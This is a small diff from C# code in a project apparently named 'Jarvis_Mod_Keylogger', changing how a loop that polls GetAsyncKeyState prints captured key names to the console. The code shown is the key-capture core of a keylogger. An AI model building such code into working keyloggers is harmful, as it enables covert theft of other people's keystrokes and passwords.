@@ -19,7 +19,7 @@ namespace Jarvis_Mod_Keylogger
                 {
                     if (GetAsyncKeyState(i) == -32767)
                     {
-                        Console.WriteLine(Enum.GetName(typeof(Keys), i) + " ");
+                        Console.Write(Enum.GetName(typeof(Keys), i) + " ");
                         
                     }
                 }
